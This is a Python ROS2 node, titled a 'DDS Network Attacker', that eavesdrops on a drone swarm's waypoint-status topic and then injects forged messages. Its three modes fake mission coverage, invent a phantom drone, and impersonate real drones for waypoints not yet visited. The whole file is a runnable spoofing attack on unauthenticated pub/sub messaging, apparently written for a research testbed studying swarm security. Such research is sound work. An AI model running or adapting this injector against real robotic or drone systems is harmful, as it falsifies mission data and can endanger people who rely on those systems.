#!/usr/bin/env python3
"""ROS2 DDS Network Attacker — exploits unauthenticated pub/sub."""
import json, time, rclpy
from rclpy.node import Node
from std_msgs.msg import String


class NetworkAttacker(Node):
    def __init__(self):
        super().__init__('network_attacker')
        self.declare_parameter('attack', 'coverage_spoof')
        self.declare_parameter('target_drone', 'drone2')
        self.declare_parameter('discovery_time', 5.0)
        self.declare_parameter('spoof_delay', 0.5)
        self.declare_parameter('num_waypoints', 18)
        self.declare_parameter('drone1_last_wp', 8)

        self.attack_mode = self.get_parameter('attack').get_parameter_value().string_value
        self.target_drone = self.get_parameter('target_drone').get_parameter_value().string_value
        self.discovery_time = self.get_parameter('discovery_time').get_parameter_value().double_value
        self.spoof_delay = self.get_parameter('spoof_delay').get_parameter_value().double_value
        self.num_waypoints = self.get_parameter('num_waypoints').get_parameter_value().integer_value
        self.drone1_last_wp = self.get_parameter('drone1_last_wp').get_parameter_value().integer_value

        self.discovered_drones = set()
        self.discovered_waypoints = {}
        self.discovered_format = None
        self.reported_waypoints = set()
        self.discovery_complete = False
        self.attack_log = []
        self.phase = 'DISCOVERY'
        self.discovery_start = time.time()

        self.attack_pub = self.create_publisher(String, '/swarm/waypoint_status', 10)
        self.eavesdrop_sub = self.create_subscription(String, '/swarm/waypoint_status', self.eavesdrop_callback, 10)
        self.timer = self.create_timer(0.5, self.attack_tick)

        self.get_logger().warn('=' * 60)
        self.get_logger().warn('ROS2 DDS NETWORK ATTACKER')
        self.get_logger().warn(f'  Attack mode:     {self.attack_mode}')
        self.get_logger().warn(f'  Target drone:    {self.target_drone}')
        self.get_logger().warn(f'  Num waypoints:   {self.num_waypoints}')
        self.get_logger().warn(f'  Drone1 last wp:  {self.drone1_last_wp} (drone2 owns {self.drone1_last_wp + 1}..{self.num_waypoints - 1})')
        self.get_logger().warn(f'  Discovery time:  {self.discovery_time}s')
        self.get_logger().warn(f'  Phase:           DISCOVERY (eavesdropping...)')
        self.get_logger().warn('=' * 60)

    def eavesdrop_callback(self, msg):
        try:
            data = json.loads(msg.data)
            if self.discovered_format is None:
                self.discovered_format = data
                self.get_logger().info(f'[DISCOVERY] Captured format: {list(data.keys())}')
            drone_id = data.get('drone_id', '')
            if drone_id and drone_id not in self.discovered_drones:
                self.discovered_drones.add(drone_id)
                self.get_logger().info(f'[DISCOVERY] Drone detected: {drone_id}')
            wp_id = data.get('waypoint_id')
            if wp_id is not None:
                if wp_id not in self.discovered_waypoints:
                    self.discovered_waypoints[wp_id] = set()
                self.discovered_waypoints[wp_id].add(drone_id)
                self.reported_waypoints.add(wp_id)
        except (json.JSONDecodeError, KeyError):
            pass

    def attack_tick(self):
        elapsed = time.time() - self.discovery_start
        if self.phase == 'DISCOVERY':
            if elapsed >= self.discovery_time:
                self.finish_discovery()
            return
        if self.phase == 'ATTACK':
            if self.attack_mode == 'coverage_spoof':
                self.execute_coverage_spoof()
            elif self.attack_mode == 'phantom_drone':
                self.execute_phantom_drone()
            elif self.attack_mode == 'selective_denial':
                self.execute_selective_denial()

    def finish_discovery(self):
        self.phase = 'ATTACK'
        self.get_logger().warn('=' * 60)
        self.get_logger().warn('[DISCOVERY COMPLETE]')
        self.get_logger().warn(f'  Drones found:    {self.discovered_drones}')
        self.get_logger().warn(f'  Waypoints seen:  {sorted(self.discovered_waypoints.keys())}')
        self.get_logger().warn(f'  Message format:  {list(self.discovered_format.keys()) if self.discovered_format else "none"}')
        self.get_logger().warn(f'  Launching attack: {self.attack_mode}')
        self.get_logger().warn('=' * 60)

    def inject_message(self, drone_id, waypoint_id, actually_visited=True):
        data = {'drone_id': drone_id, 'waypoint_id': waypoint_id,
                'timestamp': time.time(), 'actually_visited': actually_visited}
        msg = String()
        msg.data = json.dumps(data)
        self.attack_pub.publish(msg)
        self.attack_log.append({'time': time.time(), 'spoofed_drone': drone_id,
                                'waypoint_id': waypoint_id, 'attack_mode': self.attack_mode})
        self.get_logger().warn(f'[INJECT] Spoofed {drone_id} -> wp {waypoint_id} (msg #{len(self.attack_log)})')

    def execute_coverage_spoof(self):
        if not hasattr(self, '_spoof_wp_list'):
            self._spoof_wp_list = list(range(self.num_waypoints))
            self._spoof_index = 0
            self._last_inject = 0
        if self._spoof_index >= len(self._spoof_wp_list):
            return
        now = time.time()
        if now - self._last_inject < self.spoof_delay:
            return
        wp_id = self._spoof_wp_list[self._spoof_index]
        if wp_id not in self.reported_waypoints:
            self.inject_message(self.target_drone, wp_id, actually_visited=True)
            self.reported_waypoints.add(wp_id)
        self._spoof_index += 1
        self._last_inject = now

    def execute_phantom_drone(self):
        if not hasattr(self, '_phantom_wp_list'):
            self._phantom_wp_list = list(range(self.num_waypoints))
            self._phantom_index = 0
            self._last_inject = 0
            self._phantom_id = 'drone3'
            self.get_logger().warn(f'[ATTACK] Phantom identity: {self._phantom_id}')
        if self._phantom_index >= len(self._phantom_wp_list):
            return
        now = time.time()
        if now - self._last_inject < self.spoof_delay:
            return
        wp_id = self._phantom_wp_list[self._phantom_index]
        if wp_id not in self.reported_waypoints:
            self.inject_message(self._phantom_id, wp_id, actually_visited=True)
            self.reported_waypoints.add(wp_id)
        self._phantom_index += 1
        self._last_inject = now

    def execute_selective_denial(self):
        if not hasattr(self, '_selective_started'):
            self._selective_started = time.time()
            self._last_inject = 0
            self._injected = set()
            self._strike_delay = 3.0
            self.get_logger().warn(f'[ATTACK] Observing for {self._strike_delay}s before striking')
        now = time.time()
        if now - self._selective_started < self._strike_delay:
            return
        if now - self._last_inject < self.spoof_delay:
            return
        all_possible = set(range(self.num_waypoints))
        unreported = all_possible - self.reported_waypoints - self._injected
        if not unreported:
            return
        wp_id = min(unreported)
        spoof_as = self.target_drone
        if self.discovered_drones:
            if wp_id > self.drone1_last_wp:
                spoof_as = 'drone2' if 'drone2' in self.discovered_drones else self.target_drone
            else:
                spoof_as = 'drone1' if 'drone1' in self.discovered_drones else self.target_drone
        self.inject_message(spoof_as, wp_id, actually_visited=True)
        self._injected.add(wp_id)
        self.reported_waypoints.add(wp_id)
        self._last_inject = now

    def print_attack_summary(self):
        self.get_logger().warn('=' * 60)
        self.get_logger().warn('---ATTACK SUMMARY---')
        self.get_logger().warn(f'Mode:              {self.attack_mode}')
        self.get_logger().warn(f'Messages injected: {len(self.attack_log)}')
        self.get_logger().warn(f'Drones discovered: {self.discovered_drones}')
        if self.attack_log:
            spoofed_wps = [e['waypoint_id'] for e in self.attack_log]
            spoofed_ids = set(e['spoofed_drone'] for e in self.attack_log)
            self.get_logger().warn(f'Spoofed identities: {spoofed_ids}')
            self.get_logger().warn(f'Waypoints spoofed:  {sorted(spoofed_wps)}')
        self.get_logger().warn('=' * 60)


def main():
    rclpy.init()
    node = NetworkAttacker()
    try:
        rclpy.spin(node)
    except KeyboardInterrupt:
        node.print_attack_summary()
    finally:
        node.destroy_node()
        rclpy.shutdown()


if __name__ == '__main__':
    main()